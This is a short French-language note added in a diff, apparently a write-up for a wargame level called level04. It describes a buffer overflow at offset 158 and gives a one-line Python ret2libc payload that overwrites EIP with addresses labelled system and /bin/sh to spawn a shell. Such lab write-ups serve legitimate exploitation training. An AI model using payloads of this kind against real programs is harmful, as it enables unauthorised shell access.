@@ -1,0 +1,7 @@
+En executant le programme celui-ci nous demandes de rentrer un shellcode, on remarque qu'a partir d'une certaine longueur de chaine, le programme a un comportement inattentu, cela se passe a l'offset 158.
+
+On va donc reecrire sur l'eip pour executer un shell, 
+
+python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "AAAA" + "\xec\x97\xf8\xf7"' > /tmp/level04
+									|								|
+									system			arg				/bin/sh
